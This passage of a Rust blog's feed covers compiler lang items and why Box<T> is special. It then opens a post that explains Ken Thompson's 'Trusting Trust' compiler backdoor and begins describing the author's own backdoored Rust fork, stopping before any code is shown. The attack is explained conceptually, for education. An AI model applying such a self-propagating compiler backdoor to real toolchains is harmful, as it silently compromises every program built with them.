    Foo + Foo
}
</code></pre>

<p>We get an error:</p>

<pre><code>$ rustc test.rs
error[E0369]: binary operation `+` cannot be applied to type `Foo`
  --&gt; test.rs:33:5
   |
33 |     Foo + Foo
   |     ^^^
   |
note: an implementation of `std::ops::Add` might be missing for `Foo`
  --&gt; test.rs:33:5
   |
33 |     Foo + Foo
   |     ^^^

error: aborting due to previous error
</code></pre>

<p>It is interesting to note that here the compiler <em>did</em> refer to <code>Add</code> by its path.
This is because the diagnostics in the compiler are free to assume that libcore
exists. However, the actual error just noted that it doesn&rsquo;t know how to add two
<code>Foo</code>s. But we can tell it how!</p>

<pre><code class="rust">#[lang = "add"]
trait MyAdd&lt;RHS&gt; {
    type Output;
    fn add(self, other: RHS) -&gt; Self::Output;
}

impl MyAdd&lt;Foo&gt; for Foo {
    type Output = isize;
    fn add(self, other: Foo) -&gt; isize {
        return 42;
    }
}

struct Foo;
#[lang = "start"]
fn start(_main: *const u8, _argc: isize, _argv: *const *const u8) -&gt; isize {
    Foo + Foo
}
</code></pre>

<p>This will compile fine and the exit code of the program will be 42.</p>

<p>An interesting bit of behavior is what happens if we try to add two numbers. It will give us the
same kind of error, even though I mentioned before that the addition of concrete primitives doesn&rsquo;t
go through <code>Add::add</code>. However, any addition operation still checks if <code>Add::add</code> is implemented,
even though it won&rsquo;t get <em>used</em> in the case of a primitive. We can even verify this!</p>

<pre><code class="rust">#[lang = "add"]
trait MyAdd&lt;RHS&gt; {
    type Output;
    fn add(self, other: RHS) -&gt; Self::Output;
}

impl MyAdd&lt;isize&gt; for isize {
    type Output = isize;
    fn add(self, other: isize) -&gt; isize {
        self + other + 50
    }
}

struct Foo;
#[lang = "start"]
fn start(_main: *const u8, _argc: isize, _argv: *const *const u8) -&gt; isize {
    40 + 2
}
</code></pre>

<p>This will need to be compiled with <code>-C opt-level=2</code>, since numeric addition in debug mode panics on
wrap and we haven&rsquo;t defined the <code>"panic"</code> lang item to teach the compiler <em>how</em> to panic.</p>

<p>It will exit with 42, not 92, since while the <code>Add</code> implementation is required for this to type
check, it doesn&rsquo;t actually get used.</p>

<hr />

<p>So what lang items <em>are</em> there, and why are they lang items? There&rsquo;s a <a href="https://github.com/rust-lang/rust/blob/1ca100d0428985f916eea153886762bed3909771/src/librustc/middle/lang_items.rs#L252-L363">big list</a> in the
compiler. Let&rsquo;s go through them:</p>

<p>The <a href="https://github.com/rust-lang/rust/blob/1ca100d0428985f916eea153886762bed3909771/src/librustc/middle/lang_items.rs#L254-L272"><code>ImplItem</code> ones</a> (<a href="https://github.com/rust-lang/rust/blob/2782e8f8fcefdce77c5e0dd0846c15c4c5103d84/src/libstd_unicode/char.rs#L134-L135">core</a>) are used to mark implementations on
primitive types. <code>char</code> has some methods, and <em>someone</em> has to say <code>impl char</code> to define them. But
coherence only allows us to impl methods on types defined in our own crate, and <code>char</code> isn&rsquo;t defined
&hellip; in any crate, so how do we add methods to it? <code>#[lang = "char"]</code> provides an escape hatch;
applying that to <code>impl char</code> will allow you to break the coherence rules and add methods,
<a href="https://github.com/rust-lang/rust/blob/2782e8f8fcefdce77c5e0dd0846c15c4c5103d84/src/libstd_unicode/char.rs#L134-L135">as is done in the standard library</a>. Since lang items can only be defined once, only
a single crate gets the honor of adding methods to <code>char</code>, so we don&rsquo;t have any of the issues that
arise from sidestepping coherence.</p>

<p>There are a bunch for the <a href="https://github.com/rust-lang/rust/blob/1ca100d0428985f916eea153886762bed3909771/src/librustc/middle/lang_items.rs#L274-L278">marker traits</a> (<a href="https://github.com/rust-lang/rust/blob/408c2f7827be838aadcd05bd041dab94388af35d/src/libcore/marker.rs#L41-L356">core</a>):</p>

<ul>
<li><code>Send</code> is a lang item because you are allowed to use it in a <code>+</code> bound in a trait object (<code>Box&lt;SomeTrait+Send+Sync&gt;</code>), and the compiler caches it aggressively</li>
<li><code>Sync</code> is a lang item for the same reasons as <code>Send</code>, but also because the compiler needs to enforce its implementation on types used in statics</li>
<li><code>Copy</code> is fundamental to classifying values and reasoning about moves/etc, so it needs to be a lang item</li>
<li><code>Sized</code> is also fundamental to reasoning about which values may exist on the stack. It is also magically included as a bound on generic parameters unless excluded with <code>?Sized</code></li>
<li>[<code>Unsize</code>] is implemented automatically on types using a specific set of rules (<a href="https://doc.rust-lang.org/nomicon/coercions.html">listed in the nomicon</a>). Unlike <code>Send</code> and <code>Sync</code>, this mechanism for autoimplementation is tailored for the use case of <code>Unsize</code> and can&rsquo;t be reused on user-defined marker traits.</li>
</ul>


<p><a href="https://github.com/rust-lang/rust/blob/1ca100d0428985f916eea153886762bed3909771/src/librustc/middle/lang_items.rs#L280"><code>Drop</code> is a lang item</a> (<a href="https://github.com/rust-lang/rust/blob/408c2f7827be838aadcd05bd041dab94388af35d/src/libcore/ops.rs#L174-L197">core</a>) because the compiler needs to know which types have destructors, and how to call
these destructors.</p>

<p><a href="https://doc.rust-lang.org/nightly/std/ops/trait.CoerceUnsized.html"><code>CoerceUnsized</code></a> <a href="https://github.com/rust-lang/rust/blob/1ca100d0428985f916eea153886762bed3909771/src/librustc/middle/lang_items.rs#L282">is a lang item</a>
(<a href="https://github.com/rust-lang/rust/blob/408c2f7827be838aadcd05bd041dab94388af35d/src/libcore/ops.rs#L2743-L2746">core</a>) because the compiler is allowed to perform
<a href="https://github.com/rust-lang/rfcs/blob/master/text/0982-dst-coercion.md">DST coercions</a> (<a href="https://doc.rust-lang.org/nomicon/coercions.html">nomicon</a>) when it is implemented.</p>

<p><a href="https://github.com/rust-lang/rust/blob/1ca100d0428985f916eea153886762bed3909771/src/librustc/middle/lang_items.rs#L284-L307">All of the builtin operators</a> (also <a href="https://github.com/rust-lang/rust/blob/1ca100d0428985f916eea153886762bed3909771/src/librustc/middle/lang_items.rs#L311-L312"><code>Deref</code></a>
and <a href="https://github.com/rust-lang/rust/blob/1ca100d0428985f916eea153886762bed3909771/src/librustc/middle/lang_items.rs#L318-L319"><code>PartialEq</code>/<code>PartialOrd</code></a>, which are listed later in the file) (<a href="https://github.com/rust-lang/rust/blob/408c2f7827be838aadcd05bd041dab94388af35d/src/libcore/ops.rs#L243-L2035">core</a>)
are lang items because the compiler needs to know what trait to require (and call)
when it comes across such an operation.</p>

<p><a href="http://doc.rust-lang.org/std/cell/struct.UnsafeCell.html"><code>UnsafeCell</code></a> <a href="https://github.com/rust-lang/rust/blob/1ca100d0428985f916eea153886762bed3909771/src/librustc/middle/lang_items.rs#L309">is a lang item</a>
(<a href="https://github.com/rust-lang/rust/blob/408c2f7827be838aadcd05bd041dab94388af35d/src/libcore/cell.rs#L1065-L1069">core</a>) because it has very special semantics; it prevents
certain optimizations. Specifically, Rust is allowed to reorder reads/writes to <code>&amp;mut foo</code> with the
assumption that the local variable holding the reference is the only alias allowed to read from
or write to the data, and it is allowed to reorder reads from <code>&amp;foo</code> assuming that no other alias
writes to it. We tell LLVM that these types are <code>noalias</code>. <code>UnsafeCell&lt;T&gt;</code> turns this optimization
off, allowing writes to <code>&amp;UnsafeCell&lt;T&gt;</code> references. This is used in the implementation of interior
mutability types like <code>Cell&lt;T&gt;</code>, <code>RefCell&lt;T&gt;</code>, and <code>Mutex&lt;T&gt;</code>.</p>

<p>The <a href="https://github.com/rust-lang/rust/blob/1ca100d0428985f916eea153886762bed3909771/src/librustc/middle/lang_items.rs#L314-L316"><code>Fn</code> traits</a> (<a href="https://github.com/rust-lang/rust/blob/408c2f7827be838aadcd05bd041dab94388af35d/src/libcore/ops.rs#L2556-L2659">core</a>) are used in dispatching function calls,
and can be specified with special syntax sugar, so they need to be lang items. They also
get autoimplemented on closures.</p>

<p><a href="https://github.com/rust-lang/rust/blob/1ca100d0428985f916eea153886762bed3909771/src/librustc/middle/lang_items.rs#L321">The &ldquo;str_eq&rdquo; lang item</a> is outdated. It <em>used</em> to specify how to check the equality
of a string value against a literal string pattern in a <code>match</code> (<code>match</code> uses structural equality,
not <code>PartialEq::eq</code>), however I believe this behavior is now hardcoded in the compiler.</p>

<p><a href="https://github.com/rust-lang/rust/blob/1ca100d0428985f916eea153886762bed3909771/src/librustc/middle/lang_items.rs#L332-L334">The panic-related lang items</a> (<a href="https://github.com/rust-lang/rust/blob/408c2f7827be838aadcd05bd041dab94388af35d/src/libcore/panicking.rs#L39-L58">core</a>) exist because rustc itself
inserts panics in a few places. The first one, <code>"panic"</code>, is used for integer overflow panics in debug mode, and
<code>"panic_bounds_check"</code> is used for out of bounds indexing panics on slices. The last one,
<code>"panic_fmt"</code> hooks into a function defined later in libstd.</p>

<p>The <a href="https://github.com/rust-lang/rust/blob/1ca100d0428985f916eea153886762bed3909771/src/librustc/middle/lang_items.rs#L336-L337"><code>"exchange_malloc"</code> and <code>"box_free"</code></a> (<a href="https://github.com/rust-lang/rust/blob/408c2f7827be838aadcd05bd041dab94388af35d/src/liballoc/heap.rs#L129-L152">alloc</a>) are for
telling the compiler which functions to call in case it needs to do a <code>malloc()</code> or <code>free()</code>. These
are used when constructing <code>Box&lt;T&gt;</code> via placement <code>box</code> syntax and when moving out of a deref of a
box.</p>

<p><a href="https://github.com/rust-lang/rust/blob/1ca100d0428985f916eea153886762bed3909771/src/librustc/middle/lang_items.rs#L338"><code>"strdup_uniq"</code></a> seemed to be used in the past for moving string literals to the heap,
but is no longer used.</p>

<p>We&rsquo;ve already seen <a href="https://github.com/rust-lang/rust/blob/1ca100d0428985f916eea153886762bed3909771/src/librustc/middle/lang_items.rs#L340">the start lang item</a> (<a href="https://github.com/rust-lang/rust/blob/1ca100d0428985f916eea153886762bed3909771/src/libstd/rt.rs#L31-L67">std</a>) being used in our
minimal example program. This function is basically where you find Rust&rsquo;s &ldquo;runtime&rdquo;: it gets called
with a pointer to main and the command line arguments, it sets up the &ldquo;runtime&rdquo;, calls main, and
tears down anything it needs to. Rust has a C-like minimal runtime, so
<a href="https://github.com/rust-lang/rust/blob/1ca100d0428985f916eea153886762bed3909771/src/libstd/rt.rs#L31-L67">the actual libstd definition</a> doesn&rsquo;t do much.
But you theoretically could stick a very heavy runtime initialization routine here.</p>

<p>The <a href="https://github.com/rust-lang/rust/blob/1ca100d0428985f916eea153886762bed3909771/src/librustc/middle/lang_items.rs#L342-L344">exception handling lang items</a> (<a href="https://github.com/rust-lang/rust/blob/408c2f7827be838aadcd05bd041dab94388af35d/src/libpanic_unwind/seh.rs">panic_unwind</a>, in multiple
platform-specific modules) specify various bits of the exception handling behavior. These hooks are
called during various steps of unwinding: <code>eh_personality</code> is called when determining whether
or not to stop at a stack frame or unwind up to the next one. <code>eh_unwind_resume</code> is the routine
called when the unwinding code wishes to resume unwinding after calling destructors in a landing
pad. <code>msvc_try_filter</code> defines some parameter that MSVC needs in its unwinding code. I don&rsquo;t
understand it, and apparently, <a href="https://github.com/rust-lang/rust/blob/408c2f7827be838aadcd05bd041dab94388af35d/src/libpanic_unwind/seh.rs#L232">neither does the person who wrote it</a>.</p>

<p>The <a href="https://github.com/rust-lang/rust/blob/1ca100d0428985f916eea153886762bed3909771/src/librustc/middle/lang_items.rs#L346"><code>"owned_box"</code></a> (<a href="https://github.com/rust-lang/rust/blob/408c2f7827be838aadcd05bd041dab94388af35d/src/liballoc/boxed.rs#L105-L107">alloc</a>) lang item tells the compiler which type is
the <code>Box</code> type. In my previous post I covered how <code>Box</code> is special; this lang item is how the
compiler finds impls on <code>Box</code> and knows what the type is. Unlike the other primitives, <code>Box</code> doesn&rsquo;t
actually have a type name (like <code>bool</code>) that can be used if you&rsquo;re writing libcore or libstd. This
lang item gives <code>Box</code> a type name that can be used to refer to it. (It also defines some,
but not all, of the semantics of <code>Box&lt;T&gt;</code>)</p>

<p>The <a href="https://github.com/rust-lang/rust/blob/1ca100d0428985f916eea153886762bed3909771/src/librustc/middle/lang_items.rs#L348"><code>"phantom_data"</code></a> (<a href="https://github.com/rust-lang/rust/blob/2782e8f8fcefdce77c5e0dd0846c15c4c5103d84/src/libcore/marker.rs#L544-L546">core</a>) type itself is allowed to have
an unused type parameter, and it can be used to help fix the variance and drop behavior
of a generic type. More on this in <a href="https://doc.rust-lang.org/nomicon/phantom-data.html">the nomicon</a>.</p>

<p>The <a href="https://github.com/rust-lang/rust/blob/1ca100d0428985f916eea153886762bed3909771/src/librustc/middle/lang_items.rs#L360"><code>"non_zero"</code></a> lang item (<a href="https://github.com/rust-lang/rust/blob/2782e8f8fcefdce77c5e0dd0846c15c4c5103d84/src/libcore/nonzero.rs#L38-L42">core</a>) marks the <code>NonZero&lt;T&gt;</code> type,
a type which is guaranteed to never contain a bit pattern of only zeroes. This is used inside things
like <code>Rc&lt;T&gt;</code> and <code>Box&lt;T&gt;</code> &ndash; we know that the pointers in these can/should never be null, so they
contain a <code>NonZero&lt;*const T&gt;</code>. When used inside an enum like <code>Option&lt;Rc&lt;T&gt;&gt;</code>, the discriminant
(the &ldquo;tag&rdquo; value that distinguishes between <code>Some</code> and <code>None</code>) is no longer necessary, since
we can mark the <code>None</code> case as the case where the bits occupied by <code>NonZero</code> in the <code>Some</code> case
are zero. Beware, this optimization also applies to C-like enums that don&rsquo;t have a variant
corresponding to a discriminant value of zero (unless they are <code>#[repr(C)]</code>)</p>

<p>There are also a bunch of deprecated lang items there. For example, <code>NoCopy</code> used to be a struct
that could be dropped within a type to make it not implement <code>Copy</code>; in the past <code>Copy</code>
implementations were automatic like <code>Send</code> and <code>Sync</code> are today. <code>NoCopy</code> was the way to opt out.
There also used to be <code>NoSend</code> and <code>NoSync</code>. <code>CovariantType</code>/<code>CovariantLifetime</code>/etc were the
predecessors of <code>PhantomData</code>; they could be used to specify variance relations of a type with its
type or lifetime parameters, but you can now do this with providing the right <code>PhantomData</code>, e.g.
<code>InvariantType&lt;T&gt;</code> is now <code>PhantomData&lt;Cell&lt;T&gt;&gt;</code>.
The <a href="https://doc.rust-lang.org/nomicon/subtyping.html">nomicon</a> has more on variance. I don&rsquo;t know why these lang items haven&rsquo;t been
removed (they don&rsquo;t work anymore anyway); the only consumer of them is libcore so &ldquo;deprecating&rdquo; them
seems unnecessary. It&rsquo;s probably an oversight.</p>

<p>Interestingly, <code>Iterator</code> and <code>IntoIterator</code> are <em>not</em> lang items, even though they are used in <code>for</code>
loops. Instead, the compiler inserts hardcoded calls to <code>::std::iter::IntoIterator::into_iter</code> and
<code>::std::iter::Iterator::next</code>, and a hardcoded reference to <code>::std::option::Option</code> (The paths use
<code>core</code> in <code>no_std</code> mode). This is probably because the compiler desugars <code>for</code> loops before type
resolution is done, so withut this, libcore would not be able to use for loops since the compiler
wouldn&rsquo;t know what calls to insert in place of the loops while compiling.</p>

<hr />

<p>Basically, whenever the compiler needs to use special treatment with an item &ndash; whether it be
dispatching calls to functions and trait methods in various situations, conferring special semantics
to types/traits, or requiring traits to be implemented, the type will be defined in the standard
library (libstd, libcore, or one of the crates behind the libstd façade), and marked as a lang item.</p>

<p>Some of the lang items are useful/necessary when working without libstd. Most only come into play if
you want to replace libcore, which is a pretty niche thing to do, and knowing about them is rarely
useful outside of the realm of compiler hacking.</p>

<p>But, like with the <code>Box&lt;T&gt;</code> madness, I still find this quite interesting, even if it isn&rsquo;t generally
useful!</p>
<div class="footnotes">
<hr/>
<ol>
<li id="fn:1">
<p>Though as we learned in the previous post, when <code>x</code> and <code>y</code> are known numeric types it will bypass the trait and directly generate an add instruction in LLVM<a href="#fnref:1" rev="footnote">&#8617;</a></p></li>
<li id="fn:2">
<p>To be clear, I&rsquo;m not aware of any plans to eventually stabilize this. It&rsquo;s something that could happen.<a href="#fnref:2" rev="footnote">&#8617;</a></p></li>
</ol>
</div>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Rust Tidbits: Box Is Special]]></title>
    <link href="http://manishearth.github.io/blog/2017/01/10/rust-tidbits-box-is-special/"/>
    <updated>2017-01-10T22:59:43-08:00</updated>
    <id>http://manishearth.github.io/blog/2017/01/10/rust-tidbits-box-is-special</id>
    <content type="html"><![CDATA[<p>Rust is not a simple language. As with any such language, it has many little tidbits of complexity
that most folks aren&rsquo;t aware of. Many of these tidbits are ones which may not practically matter
much for everyday Rust programming, but are interesting to know. Others may be more useful. I&rsquo;ve
found that a lot of these aren&rsquo;t documented anywhere (not that they always should be), and sometimes
depend on knowledge of compiler internals or history. As a fan of programming trivia myself, I&rsquo;ve
decided to try writing about these things whenever I come across them. &ldquo;Tribal Knowledge&rdquo; shouldn&rsquo;t
be a thing in a programming community; and trivia is fun!</p>

<hr />

<p>So. <code>Box&lt;T&gt;</code>. Your favorite heap allocation type that nobody uses<sup id="fnref:1"><a href="#fn:1" rel="footnote">1</a></sup>.</p>

<p>I was discussing some stuff on the rfcs repo when
<a href="https://github.com/rust-lang/rfcs/issues/1850#issuecomment-271766300">@burdges realized that <code>Box&lt;T&gt;</code> has a funky <code>Deref</code> impl</a>.</p>

<p>Let&rsquo;s <a href="https://github.com/rust-lang/rust/blob/e4fee525e04838dabc82beed5ae1a06051be53fd/src/liballoc/boxed.rs#L502">look at it</a>:</p>

<pre><code class="rust">#[stable(feature = "rust1", since = "1.0.0")]
impl&lt;T: ?Sized&gt; Deref for Box&lt;T&gt; {
    type Target = T;

    fn deref(&amp;self) -&gt; &amp;T {
        &amp;**self
    }
}

#[stable(feature = "rust1", since = "1.0.0")]
impl&lt;T: ?Sized&gt; DerefMut for Box&lt;T&gt; {
    fn deref_mut(&amp;mut self) -&gt; &amp;mut T {
        &amp;mut **self
    }
}
</code></pre>

<p>Wait, what? <em>Squints</em></p>

<pre><code class="rust">    fn deref(&amp;self) -&gt; &amp;T {
        &amp;**self
    }
</code></pre>

<p><em>The call is coming from inside the house!</em></p>

<p>In case you didn&rsquo;t realize it, this deref impl returns <code>&amp;**self</code> &ndash; since <code>self</code>
is an <code>&amp;Box&lt;T&gt;</code>, dereferencing it once will provide a <code>Box&lt;T&gt;</code>, and the second dereference
will dereference the box to provide a <code>T</code>. We then wrap it in a reference and return it.</p>

<p>But wait, we are <em>defining</em> how a <code>Box&lt;T&gt;</code> is to be dereferenced (that&rsquo;s what <code>Deref::deref</code> is
for!), such a definition cannot itself dereference a <code>Box&lt;T&gt;</code>! That&rsquo;s infinite recursion.</p>

<p>And indeed. For any other type such a <code>deref</code> impl would recurse infinitely. If you run
<a href="https://play.rust-lang.org/?gist=9c8a02336c6816e57c83de39c103ca06&amp;version=stable&amp;backtrace=0">this code</a>:</p>

<pre><code class="rust">use std::ops::Deref;

struct LolBox&lt;T&gt;(T);

impl&lt;T&gt; Deref for LolBox&lt;T&gt; {
    type Target = T;
    fn deref(&amp;self) -&gt; &amp;T {
        &amp;**self
    }
}
</code></pre>

<p>the compiler will warn you:</p>

<pre><code class="text">warning: function cannot return without recurring, #[warn(unconditional_recursion)] on by default
 --&gt; &lt;anon&gt;:7:5
  |
7 |     fn deref(&amp;self) -&gt; &amp;T {
  |     ^
  |
note: recursive call site
 --&gt; &lt;anon&gt;:8:10
  |
8 |         &amp;**self
  |          ^^^^^^
  = help: a `loop` may express intention better if this is on purpose
</code></pre>

<p>Actually trying to dereference the type will lead to a stack overflow.</p>

<p>Clearly something is fishy here. This deref impl is similar to <a href="https://github.com/rust-lang/rust/blob/52c03d1d619fd25c961bc9de59bcc942b660d5db/src/libcore/ops.rs#L2460">the deref impl for <code>&amp;T</code></a>,
or the <a href="https://github.com/rust-lang/rust/blob/52c03d1d619fd25c961bc9de59bcc942b660d5db/src/libcore/ops.rs#L263"><code>Add</code> impl for number types</a>, or any other of the implementations of operators on
primitive types. For example we literally
<a href="https://github.com/rust-lang/rust/blob/52c03d1d619fd25c961bc9de59bcc942b660d5db/src/libcore/ops.rs#L263">define <code>Add</code> on two integers to be their addition</a>. The reason these impls need to exist
is so that people can still call <code>Add::add</code> if they need to in generic code and be able to pass
integers to things with an <code>Add</code> bound. But the compiler knows how to use builtin operators on
numbers and dereference borrowed references without these impls. But those are primitive types
which are defined in the compiler, while <code>Box&lt;T&gt;</code> is just a regular smart pointer struct, right?</p>

<p>Turns out, <code>Box&lt;T&gt;</code> is special. It, too, is somewhat of a primitive type.</p>

<p>This is partly due to historical accident.</p>

<p>To understand this, we must look back to Ye Olde days of pre-1.0 Rust (ca 2014). Back in these days,
we had none of this newfangled &ldquo;stability&rdquo; business. The compiler broke your code every two weeks.
Of course, you wouldn&rsquo;t <em>know</em> that because the compiler would usually crash before it could tell
you that your code was broken! Sigils roamed the lands freely, and cargo was but a newborn child
which was destined to eventually end the tyranny of Makefiles. People were largely happy knowing
that their closures were safely boxed and their threads sufficiently green.</p>

<p>Back in these days, we didn&rsquo;t have <code>Box&lt;T&gt;</code>, <code>Vec&lt;T&gt;</code>, or <code>String</code>. We had <code>~T</code>, <code>~[T]</code>, and <code>~str</code>.
The second two are <em>not</em> equivalent to <code>Box&lt;[T]&gt;</code> and <code>Box&lt;str&gt;</code>, even though they may look like it,
they are both growable containers like <code>Vec&lt;T&gt;</code> and <code>String</code>. <code>~</code> conceptually meant &ldquo;owned&rdquo;, though
IMO that caused more confusion than it was worth.</p>

<p>You created a box using the <code>~</code> operator, e.g. <code>let x = ~1;</code>. It could be dereferenced with the <code>*</code>
operator, and autoderef worked much like it does today.</p>

<p>As a &ldquo;primitive&rdquo; type; like all primitive types, <code>~T</code> was special. The compiler knew things about
it. The compiler knew how to dereference it without an explicit <code>Deref</code> impl. In fact, the <code>Deref</code>
traits <a href="https://github.com/rust-lang/rust/pull/12491">came into existence</a> much after <code>~T</code> did. <code>~T</code> never got an explicit <code>Deref</code> impl,
though it probably should have.</p>

<p>Eventually, there was a move to remove sigils from the language. The box constructor <code>~foo</code> was
superseded by <a href="https://github.com/rust-lang/rust/pull/11055/">placement <code>box</code> syntax</a>, which still exists in Rust nightly<sup id="fnref:2"><a href="#fn:2" rel="footnote">2</a></sup>. Then, the
<a href="https://github.com/rust-lang/rust/pull/13904"><code>~T</code> type became <code>Box&lt;T&gt;</code></a>. (<code>~[T]</code> and <code>~str</code> would also be removed, though <code>~str</code> took
a very confusing detour with <code>StrBuf</code> first).</p>

<p>However, <code>Box&lt;T&gt;</code> was still special. It no longer needed special syntax to be referred to or
constructed, but it was still internally a special type. It didn&rsquo;t even have a <code>Deref</code> impl yet,
that came <a href="https://github.com/rust-lang/rust/pull/20052">six months later</a>, and it was implemented as <code>&amp;**self</code>, exactly the same
as it is today.</p>

<p>But why does it <em>have</em> to be special now? Rust had all the features it needed (allocations,
ownership, overloadable deref) to implement <code>Box&lt;T&gt;</code> in pure rust in the stdlib as if it
were a regular type.</p>

<p>Turns out that Rust didn&rsquo;t. You see, because <code>Box&lt;T&gt;</code> and before it <code>~T</code> were special, their
dereference semantics were implemented in a different part of the code. And, these semantics were
not the same as the ones for <code>DerefImm</code> and <code>DerefMut</code>, which were created for use with other smart
pointers. I don&rsquo;t know if the possibility of being used for <code>~T</code> was considered when
<code>DerefImm</code>/<code>DerefMut</code> were being implemented, or if it was a simple oversight, but <code>Box&lt;T&gt;</code> has
three pieces of behavior that could not be replicated in pure Rust at the time:</p>

<ul>
<li><code>box foo</code> in a pattern would destructure a box into its contents. It&rsquo;s somewhat the opposite of <code>ref</code></li>
<li><code>box foo()</code> performed placement box, so the result of <code>foo()</code> could be directly written to a preallocated box, reducing extraneous copies</li>
<li>You could <em>move out of deref</em> with <code>Box&lt;T&gt;</code></li>
</ul>


<p>The third one is the one that really gets to us here<sup id="fnref:3"><a href="#fn:3" rel="footnote">3</a></sup>.
For a <em>regular</em> type, <code>*foo</code> will produce a temporary that must be immediately borrowed or copied.
You cannot do <code>let x = *y</code> for a non-<code>Copy</code> type. This dereference operation will call
<code>DerefMut::deref_mut</code> or <code>Deref::deref</code> based on how it gets borrowed. With <code>Box&lt;T&gt;</code>, you can do
this:</p>

<pre><code class="rust">let x = Box::new(vec![1,2,3,4]);
let y = *x; // moves the vec out into `y`, then deallocates the box
            // but does not call a destructor on the vec
</code></pre>

<p>For any other type, such an operation will produce a &ldquo;cannot move out of a borrow&rdquo; error.</p>

<p>This operation is colloquially called <code>DerefMove</code>, and there has been <a href="https://github.com/rust-lang/rfcs/pull/178/files?short_path=6f69a99#diff-6f69a990502a98c2eeb172d87269005d">an rfc</a> in the
past for making it into a trait. I suspect that the <code>DerefMove</code> semantics could even have been
removed from <code>Box&lt;T&gt;</code> before 1.0 (I don&rsquo;t find it <em>necessary</em>), but people had better things to do,
like fixing the million other rough edges of the language that can&rsquo;t be touched after backwards
compatibility is a thing.</p>

<p>So now we&rsquo;re stuck with it. The current status is that <code>Box&lt;T&gt;</code> is <em>still</em> a special type in the
compiler. By &ldquo;special type&rdquo; I don&rsquo;t just mean that the compiler treats it a bit differently (this is
true for any lang item), I mean that it literally is treated as
<a href="http://manishearth.github.io/rust-internals-docs/rustc/ty/enum.TypeVariants.html#TyBox.v">a completely new kind of type</a>, not as a struct the way it has been defined in liballoc.
There&rsquo;s a TON of cruft in the compiler related to this type, much of which can be removed, but some
of which can&rsquo;t. If we ever do get <code>DerefMove</code>, we should probably try removing it all again. After
writing this post I&rsquo;m half-convinced to try and implement an internal-use-only <code>DerefMove</code> and try
cleaning up the code myself.</p>

<p>Most of this isn&rsquo;t really useful to know unless you actually come across a case where you can make
use of <code>DerefMove</code> semantics, or if you work on the compiler. But it certainly is interesting!</p>

<p>Next post: <a href="http://manishearth.github.io/blog/2017/01/11/rust-tidbits-what-is-a-lang-item/">What is a lang item?</a></p>
<div class="footnotes">
<hr/>
<ol>
<li id="fn:1">
<p>Seriously though, does anyone use it much? I&rsquo;ve only seen it getting used for boxed DSTs (trait objects and boxed slices), which themselves are pretty rare, for sending heap types over FFI, recursive types (rare), and random special cases. I find this pretty interesting given that other languages are much more liberal with non-refcounted single-element allocation.<a href="#fnref:1" rev="footnote">&#8617;</a></p></li>
<li id="fn:2">
<p>It will probably eventually be replaced or made equivalent to the <code>&lt;-</code> syntax before stabilizing<a href="#fnref:2" rev="footnote">&#8617;</a></p></li>
<li id="fn:3">
<p>It&rsquo;s easier to special case the first two, much like how <code>for</code> loops are aware of the iterator trait without the iterator trait being extremely special cased<a href="#fnref:3" rev="footnote">&#8617;</a></p></li>
</ol>
</div>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Reflections on Rusting Trust]]></title>
    <link href="http://manishearth.github.io/blog/2016/12/02/reflections-on-rusting-trust/"/>
    <updated>2016-12-02T11:28:27-08:00</updated>
    <id>http://manishearth.github.io/blog/2016/12/02/reflections-on-rusting-trust</id>
    <content type="html"><![CDATA[<p>The Rust compiler is written in Rust. This is overall a pretty common practice in compiler
development. This usually means that the process of building the compiler involves downloading a
(typically) older version of the compiler.</p>

<p>This also means that the compiler is vulnerable to what is colloquially known as the &ldquo;Trusting
Trust&rdquo; attack, an attack described in <a href="https://www.ece.cmu.edu/~ganger/712.fall02/papers/p761-thompson.pdf">Ken Thompson&rsquo;s acceptance speech for the 1983 Turing Award</a>.
This kind of thing fascinates me, so I decided to try writing one myself. It&rsquo;s stuff like this which
started my interest in compilers, and I hope this post can help get others interested the same way.</p>

<p>To be clear, this isn&rsquo;t an indictment of Rust&rsquo;s security. Quite a few languages out there have
popular self-hosted compilers (C, C++, Haskell, Scala, D, Go) and are vulnerable to this attack. For
this attack to have any effect, one needs to be able to uniformly distribute this compiler, and
there are roughly equivalent ways of doing the same level of damage with that kind of access.</p>

<p>If you already know what a trusting trust attack is, you can skip the next section. If you just want
to see the code, it&rsquo;s in the <a href="https://github.com/Manishearth/rust/tree/rusting-trust">trusting-trust branch</a> on my Rust fork, specifically
<a href="https://github.com/Manishearth/rust/blob/rusting-trust/src/librustc_driver/driver.rs#L541">this code</a>.</p>

<h2>The attack</h2>

<p>The essence of the attack is this:</p>

<p>An attacker can conceivably change a compiler such that it can detect a particular kind of application and
make malicious changes to it. The example given in the talk was the UNIX <code>login</code> program &mdash; the attacker
can tweak a compiler so as to detect that it is compiling the <code>login</code> program, and compile in a
backdoor that lets it unconditionally accept a special password (created by the attacker) for any
user, thereby giving the attacker access to all accounts on all systems that have <code>login</code> compiled
by their modified compiler.</p>

<p>However, this change would be detected in the source. If it was not included in the source, this
change would disappear in the next release of the compiler, or when someone else compiles the
compiler from source. Avoiding this attack is easily done by compiling your own compilers and not
downloading untrusted binaries. This is good advice in general regarding untrusted binaries, and it
equally applies here.</p>

<p>To counter this, the attacker can go one step further. If they can tweak the compiler so as to
backdoor <code>login</code>, they could also tweak the compiler so as to backdoor itself. The attacker needs to
modify the compiler with a backdoor which detects when it is compiling the same compiler, and
introduces <em>itself</em> into the compiler that it is compiling. On top of this it can also introduce
backdoors into <code>login</code> or whatever other program the attacker is interested in.</p>

<p>Now, in this case, even if the backdoor is removed from the source, <em>every compiler compiled using
this backdoored compiler will be similarly backdoored</em>. So if this backdoored compiler somehow
starts getting distributed, it will spread itself as it is used to compile more copies of itself
(e.g. newer versions, etc). And it will be virtually undetectable &mdash; since the source doesn&rsquo;t
need to be modified for it to work; just the non-human-readable binary.</p>

<p>Of course, there are ways to protect against this. Ultimately, before a compiler for language X
existed, that compiler had to be written in some other language Y. If you can track the sources back
to that point you can bootstrap a working compiler from scratch and keep compiling newer compiler
versions till you reach the present. This raises the question of whether or not Y&rsquo;s compiler is
backdoored. While it sounds pretty unlikely that such a backdoor could be so robust as to work on
two different compilers and stay put throughout the history of X, you can of course trace back Y
back to other languages and so on till you find a compiler in assembly that you can verify<sup id="fnref:1"><a href="#fn:1" rel="footnote">1</a></sup>.</p>

<h2>Backdooring Rust</h2>

<p>Alright, so I want to backdoor my compiler. I first have to decide when in the pipeline the code
that insert backdoors executes. The Rust compiler operates by taking source code, parsing it into a
syntax tree (AST), transforming it into some intermediate representations (HIR and MIR), and feeding
it to LLVM in the form of LLVM IR, after which LLVM does its thing and creates binaries. A backdoor
